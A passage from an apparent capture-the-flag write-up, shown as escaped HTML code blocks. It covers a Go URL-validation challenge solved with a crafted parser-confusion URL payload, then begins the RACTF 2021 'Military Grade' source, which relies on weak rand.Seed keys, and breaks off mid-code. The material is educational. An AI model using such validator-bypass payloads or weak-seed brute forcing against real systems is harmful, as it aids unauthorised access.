&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">input&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">err&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Scheme&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http&amp;#34;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Errorf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;err: Invalid Scheme [%s]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Scheme&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Opaque&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Errorf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;err: WHAT AER YOU DOING ?!!! (%s)&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Opaque&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Hostname&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;127.0.0.1&amp;#34;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Errorf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;err: Invalid Hostname [%s]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Hostname&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Port&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Port&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;80&amp;#34;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Errorf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;err: Invalid Port [%s]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Port&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">User&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Errorf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;err: Authorization Required&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Username&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Errorf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;err: Invalid Username [%s]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Username&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">set&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Password&lt;/span>&lt;span style="color:#111">();&lt;/span> &lt;span style="color:#111">!&lt;/span>&lt;span style="color:#75af00">set&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#75af00">password&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;P@ssw0rd!&amp;#34;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Errorf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;err: Invalid Password [%s]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">RequestURI&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;/flag.php&amp;#34;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Errorf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;err: Invalid RequestURI [%s]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">RequestURI&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fragment&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Errorf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;err: Invalid Fragment [%s]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fragment&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">!&lt;/span>&lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Contains&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">String&lt;/span>&lt;span style="color:#111">(),&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39;Pwned!&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">String&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Errorf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;err: San Check failed&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">String&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>http://root:P@ssw0rd!@[127.0.0.1][&amp;#39;Pwned!&amp;#39;]:80/flag.php
&lt;/code>&lt;/pre>&lt;h2 id="randseed-ç§å­å°çš„æƒ…å†µä¸‹å¯çˆ†ç ´">rand.Seed ç§å­å°çš„æƒ…å†µä¸‹å¯çˆ†ç ´&lt;/h2>
&lt;h3 id="ractf-2021military-grade">[RACTF 2021]Military Grade&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;bytes&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;crypto/aes&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;crypto/cipher&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;encoding/hex&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;log&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;math/rand&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;net/http&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;sync&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;time&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">rawFlag&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;[REDACTED]&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">flagmu&lt;/span> &lt;span style="color:#75af00">sync&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Mutex&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">PKCS5Padding&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">blockSize&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">after&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">padding&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">blockSize&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#75af00">blockSize&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">padtext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">bytes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Repeat&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">padding&lt;/span>&lt;span style="color:#111">)},&lt;/span> &lt;span style="color:#75af00">padding&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">padtext&lt;/span>&lt;span style="color:#f92672">...&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">plaintext&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bKey&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bIV&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">blockSize&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">bPlaintext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">PKCS5Padding&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">plaintext&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#75af00">blockSize&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">plaintext&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCipher&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bKey&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ciphertext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bPlaintext&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">mode&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">cipher&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCBCEncrypter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bIV&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">mode&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">CryptBlocks&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bPlaintext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">hex&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">EncodeToString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">changer&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ticker&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewTicker&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Millisecond&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">672&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">C&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#00a8c8">range&lt;/span> &lt;span style="color:#75af00">ticker&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Now&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">UnixNano&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#111">^&lt;/span>&lt;span style="color:#ae81ff">0x7FFFFFFFFEFFF000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Int63&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
